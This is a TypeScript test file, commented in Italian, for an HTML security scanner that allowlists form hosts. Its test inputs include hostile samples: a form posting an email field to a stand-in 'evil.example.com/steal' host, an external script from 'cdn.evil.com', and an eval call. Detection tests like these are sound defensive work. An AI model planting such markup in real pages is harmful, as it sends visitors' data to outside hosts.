/**
 * Test del security scanner sull'allowlist degli host dei form (fix del blocco
 * di pubblicazione). Offline, deterministici.
 * Lancio: npx tsx --test test/scannerFormHost.test.ts
 *
 * Verifica che il form di brik (action assoluta verso l'host fidato) NON blocchi,
 * ma che TUTTE le altre protezioni restino attive: host di form non consentiti,
 * script esterni, eval, iframe esterni.
 */
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { makeBasicSecurityScanner } from '../src/security/scanner.js';

// Lo scanner di produzione è creato con l'host derivato da APP_URL (thebrik.it).
const scanner = makeBasicSecurityScanner({ allowedFormHosts: ['thebrik.it'] });

test('form verso host brik consentito → NON bloccato', () => {
  // Esattamente ciò che brik inietta: action assoluta a {APP_URL}/api/contact.
  const html = '<form method="POST" action="https://thebrik.it/api/contact"><input name="email"></form>';
  const r = scanner.scan(html);
  assert.equal(r.blocked, false);
  assert.equal(r.findings.some((f) => f.code === 'FORM_EXT_ACTION'), false);
});

test('form verso host esterno NON consentito → resta bloccato', () => {
  const html = '<form method="POST" action="https://evil.example.com/steal"><input name="email"></form>';
  const r = scanner.scan(html);
  assert.equal(r.blocked, true);
  assert.equal(r.findings.some((f) => f.code === 'FORM_EXT_ACTION'), true);
});

test('script esterno → resta bloccato', () => {
  const r = scanner.scan('<script src="https://cdn.evil.com/x.js"></script>');
  assert.equal(r.blocked, true);
  assert.equal(r.findings.some((f) => f.code === 'EXT_SCRIPT'), true);
});

test('eval() → resta bloccato', () => {
  const r = scanner.scan('<script>eval("alert(1)")</script>');
  assert.equal(r.blocked, true);
  assert.equal(r.findings.some((f) => f.code === 'EVAL'), true);
});

test('iframe esterno → resta bloccato', () => {
  const r = scanner.scan('<iframe src="https://maps.example.com/embed"></iframe>');
  assert.equal(r.blocked, true);
  assert.equal(r.findings.some((f) => f.code === 'EXT_IFRAME'), true);
});

test('host consentito ma con anche uno script esterno → comunque bloccato (l\'allowlist vale solo per i form)', () => {
  const html =
    '<form method="POST" action="https://thebrik.it/api/contact"></form>' +
    '<script src="https://cdn.evil.com/x.js"></script>';
  const r = scanner.scan(html);
  assert.equal(r.blocked, true); // lo script esterno blocca comunque
  assert.equal(r.findings.some((f) => f.code === 'FORM_EXT_ACTION'), false); // il form invece è ok
  assert.equal(r.findings.some((f) => f.code === 'EXT_SCRIPT'), true);
});
